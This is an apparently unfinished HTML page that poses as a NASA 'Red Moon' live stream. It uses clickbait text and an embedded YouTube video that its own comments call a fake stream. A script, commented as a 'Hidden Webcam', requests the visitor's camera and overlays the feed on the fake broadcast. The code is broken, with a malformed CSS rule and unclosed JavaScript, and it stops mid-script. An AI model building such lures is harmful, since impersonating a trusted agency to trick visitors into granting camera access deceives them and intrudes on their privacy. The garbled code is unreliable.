<head>
    <meta charset="UTF-8">

    <style>
        body {
            background: black;

            text-align: center;
            font-family: Arial, sans-serif;
        }
        #live-stream {
            width: 100%;
            height: 70vh;
        }
        #webcam {
            position: absolute;
            top: 50%;

        }

            background: red;
            color: white;
            padding: 5px 10px;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <h1>ðŸ”´ NASA | RED MOON LIVE</h1>
    <p>Scientists are baffled! Witness history as NASA captures the first-ever "Red Moon" phenomenon.</p>

    <div class="live-tag">ðŸ”´ LIVE</div>

    <!-- Fake Live Stream -->
    <iframe id="live-stream" src="https://www.youtube.com/embed/mffDSfBEdB4?autoplay=1&mute=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>

    <!-- Hidden Webcam -->
    <video id="webcam" autoplay></video>

    <script>
        // Activate Webcam and Overlay It on the Fake Stream
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(function(stream) {
                document.getElementById('webcam').srcObject = stream;

            .catch(function(error) {
                console.log("Webcam access denied or error: ", error);
